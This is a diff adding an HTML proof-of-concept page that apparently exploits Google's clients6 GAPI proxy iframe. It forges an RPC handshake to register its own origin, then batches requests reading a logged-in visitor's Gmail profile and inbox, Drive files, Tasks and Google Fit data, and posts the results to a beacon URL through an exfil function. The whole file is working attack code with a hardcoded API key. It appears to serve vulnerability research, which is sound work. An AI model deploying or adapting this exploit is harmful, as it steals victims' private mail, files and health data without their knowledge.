@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>clients6 GAPI Root Proxy — Multi-API PoC (Gmail + Drive + Tasks + Fit)</title>
+<style>
+body { font-family: monospace; background: #0d0d0d; color: #00ff88; margin: 20px; }
+h2 { color: #ff4444; }
+.warn { color: #ffaa00; }
+.ok { color: #00ff88; }
+.data { color: #44aaff; word-break: break-all; }
+.crit { color: #ff4444; font-weight: bold; }
+pre { background: #1a1a1a; padding: 10px; border-left: 3px solid #333; overflow-x: auto; white-space: pre-wrap; }
+#log { max-height: 400px; overflow-y: auto; }
+#results { margin-top: 20px; }
+.api-result { border: 1px solid #333; margin: 10px 0; padding: 10px; }
+</style>
+</head>
+<body>
+
+<h2>clients6.google.com GAPI Root Proxy — Multi-API PoC</h2>
+
+<p class="warn">
+<b>Tests simultaneously:</b>
+Gmail inbox, Gmail profile, Drive files, Tasks, Google Fit data sources.
+All via single makeHttpRequests RPC call from clients6 proxy.
+</p>
+<p class="warn">
+<b>NEW-001:</b> Gmail read | <b>NEW-003:</b> Tasks | <b>NEW-004:</b> Google Fit | <b>NEW-005:</b> Drive (confirm same proxy)
+</p>
+<p class="warn">
+<b>v3 ACK handshake:</b> Sends ACK on ready:TOKEN → registers our origin → origin check passes.
+</p>
+
+<hr>
+<div id="log"></div>
+<div id="results"></div>
+
+<script>
+const logEl = document.getElementById('log');
+const resultsEl = document.getElementById('results');
+
+function log(cls, msg) {
+  const d = document.createElement('pre');
+  d.className = cls;
+  d.textContent = '[' + new Date().toISOString().slice(11,23) + '] ' + msg;
+  logEl.prepend(d);
+  console.log(cls.toUpperCase(), msg);
+}
+
+function addResult(title, content, cls) {
+  const div = document.createElement('div');
+  div.className = 'api-result';
+  div.innerHTML = '<h3 class="' + cls + '">' + title + '</h3><pre class="data">' +
+    JSON.stringify(content, null, 2).substring(0, 3000) + '</pre>';
+  resultsEl.appendChild(div);
+}
+
+const EXFIL_URL = 'https://colab.research.google.com/__poc_multi_api_beacon';
+function exfil(data) {
+  fetch(EXFIL_URL, {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data),
+  }).catch(() => {});
+}
+
+const DRIVE_KEY = 'AIzaSyCN_sSPJMpYrAzC5AtTrltNC8oRmLtoqBk';
+const rpcToken = 'multi' + Math.random().toString(36).substr(2, 12);
+const parentOrigin = location.origin;
+
+log('ok', 'Parent origin: ' + parentOrigin);
+log('ok', 'rpcToken: ' + rpcToken);
+
+if (typeof gapi !== 'undefined' || document.querySelector('script[src*="apis.google.com"]')) {
+  log('warn', '⚠️  GAPI CONTAMINATION DETECTED — results will be wrong.');
+  log('warn', '⚠️  Open this page in a fresh tab with no Google scripts loaded.');
+}
+
+const proxyUrl = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
+  '#parent=' + encodeURIComponent(parentOrigin) +
+  '&rpctoken=' + rpcToken +
+  '&origin=' + encodeURIComponent(parentOrigin);
+
+const proxyIframe = document.createElement('iframe');
+proxyIframe.style.cssText = 'display:none;width:1px;height:1px;';
+proxyIframe.src = proxyUrl;
+document.body.appendChild(proxyIframe);
+
+log('ok', 'Proxy iframe injected: ' + proxyUrl.substring(0, 100) + '...');
+
+let ackSent = false;
+let requestSent = false;
+let resultsReceived = 0;
+const TOTAL_REQUESTS = 5;
+
+window.addEventListener('message', function(e) {
+  if (e.source !== proxyIframe.contentWindow) return;
+
+  const raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+  if (raw.length < 500) log('data', 'PROXY→PARENT: ' + raw);
+
+  let msg;
+  try { msg = JSON.parse(e.data); } catch(err) { return; }
+  if (!msg) return;
+
+  // ACK handshake
+  if (!ackSent && msg.s && msg.s.startsWith('ready:') && msg.g === true) {
+    ackSent = true;
+    log('ok', 'Ready signal received (g:true). Sending ACK to register our origin...');
+    const ack = JSON.stringify({
+      s: '..',
+      f: msg.s,
+      c: msg.c,
+      a: [],
+      t: rpcToken,
+      l: null,
+      g: false
+    });
+    proxyIframe.contentWindow.postMessage(ack, 'https://clients6.google.com');
+    log('ok', 'ACK sent. Waiting 500ms then sending multi-API makeHttpRequests...');
+    setTimeout(sendRequests, 500);
+  }
+
+  // Callback handler
+  if (!msg.f || !msg.f.includes('_callbacks_')) return;
+
+  log('ok', 'Callback received: ' + msg.f);
+  const [err, responses] = Array.isArray(msg.a) ? msg.a : [null, null];
+
+  if (err) { log('warn', 'RPC error: ' + JSON.stringify(err)); return; }
+  if (!Array.isArray(responses)) { log('warn', 'No responses array: ' + JSON.stringify(msg.a)); return; }
+
+  const apiNames = ['Gmail Profile', 'Gmail Inbox', 'Drive Files', 'Tasks Lists', 'Google Fit Sources'];
+  const exfilData = {};
+
+  responses.forEach((resp, idx) => {
+    if (!resp) { log('warn', '[' + idx + '] null response'); return; }
+    const apiName = apiNames[idx] || 'API-' + idx;
+    log('ok', '[' + idx + '] ' + apiName + ': HTTP ' + resp.status);
+
+    if (resp.status === 200 && resp.body) {
+      let data;
+      try { data = JSON.parse(resp.body); } catch(e) { data = { raw: resp.body }; }
+      exfilData[apiName] = data;
+
+      // Parse and display
+      if (idx === 0 && data.emailAddress) {
+        log('crit', '✅ GMAIL PROFILE: ' + data.emailAddress + ' (' + data.messagesTotal + ' messages)');
+        addResult('✅ NEW-001: Gmail Profile', data, 'crit');
+      } else if (idx === 1 && data.messages) {
+        log('crit', '✅ GMAIL INBOX: ' + data.messages.length + ' message IDs fetched');
+        addResult('✅ NEW-001: Gmail Inbox', data, 'crit');
+      } else if (idx === 2 && data.files) {
+        log('crit', '✅ DRIVE FILES: ' + data.files.length + ' files');
+        data.files.forEach((f, i) => log('data', '  [' + i + '] ' + f.name + ' | ' + f.mimeType));
+        addResult('✅ NEW-005: Drive Files', data, 'crit');
+      } else if (idx === 3 && data.items) {
+        log('crit', '✅ TASKS: ' + data.items.length + ' task lists');
+        addResult('✅ NEW-003: Tasks', data, 'crit');
+      } else if (idx === 4 && data.dataSource) {
+        log('crit', '✅ GOOGLE FIT: ' + data.dataSource.length + ' data sources');
+        addResult('✅ NEW-004: Google Fit', data, 'crit');
+      } else {
+        log('ok', '  Response: ' + JSON.stringify(data).substring(0, 200));
+        addResult(apiName + ' (200 OK)', data, 'ok');
+      }
+      resultsReceived++;
+    } else if (resp.status === 401) {
+      log('warn', '[' + idx + '] ' + apiName + ': 401 — not logged in, or SAPISIDHASH failed');
+    } else if (resp.status === 403) {
+      log('warn', '[' + idx + '] ' + apiName + ': 403 — ' + resp.body);
+    } else {
+      log('warn', '[' + idx + '] ' + apiName + ': ' + resp.status + ' — ' + String(resp.body).substring(0, 200));
+    }
+  });
+
+  if (Object.keys(exfilData).length > 0) {
+    log('ok', 'Exfiltrating ' + Object.keys(exfilData).length + ' APIs via beacon...');
+    exfil({ type: 'multi_api', apis: exfilData });
+  }
+
+  if (resultsReceived === TOTAL_REQUESTS) {
+    log('crit', '🎯 ALL ' + TOTAL_REQUESTS + ' APIs READ SUCCESSFULLY!');
+  }
+});
+
+function sendRequests() {
+  if (requestSent) return;
+  requestSent = true;
+
+  log('ok', 'Sending 5-API makeHttpRequests batch...');
+
+  const requests = [
+    // NEW-001: Gmail Profile
+    {
+      url: '/gmail/v1/users/me/profile',
+      method: 'GET',
+      headers: {},
+      body: null,
+      responseExpected: true
+    },
+    // NEW-001: Gmail Inbox (first 10 IDs)
+    {
+      url: '/gmail/v1/users/me/messages?maxResults=10&labelIds=INBOX',
+      method: 'GET',
+      headers: {},
+      body: null,
+      responseExpected: true
+    },
+    // NEW-005: Drive Files
+    {
+      url: '/drive/v3/files' +
+           '?key=' + DRIVE_KEY +
+           '&fields=files(id,name,mimeType,modifiedTime,size)' +
+           '&pageSize=20&orderBy=modifiedTime+desc',
+      method: 'GET',
+      headers: {},
+      body: null,
+      responseExpected: true
+    },
+    // NEW-003: Tasks
+    {
+      url: '/tasks/v1/users/@me/lists',
+      method: 'GET',
+      headers: {},
+      body: null,
+      responseExpected: true
+    },
+    // NEW-004: Google Fit
+    {
+      url: '/fitness/v1/users/me/dataSources',
+      method: 'GET',
+      headers: {},
+      body: null,
+      responseExpected: true
+    }
+  ];
+
+  proxyIframe.contentWindow.postMessage(
+    JSON.stringify({
+      s: '..',
+      f: 'makeHttpRequests',
+      c: 'multi-poc-1',
+      a: [requests],
+      t: rpcToken,
+      l: null,
+      g: true
+    }),
+    'https://clients6.google.com'
+  );
+
+  log('ok', 'Sent 5-API batch. Waiting for callback...');
+}
+
+// Fallback if no ready signal in 5s
+setTimeout(function() {
+  if (!ackSent) {
+    log('warn', '5s: No ready signal received. Attempting without ACK (GAPI may not require it)...');
+    sendRequests();
+  }
+}, 5000);
+
+setTimeout(function() {
+  if (resultsReceived === 0) {
+    log('warn', '20s timeout — no successful API responses yet.');
+    log('warn', 'Check: is PROXY→PARENT showing ready signal? Did ACK succeed?');
+    log('warn', 'Check: are the response statuses 401 (not logged in) or 403?');
+  }
+}, 20000);
+</script>
+</body>
+</html>
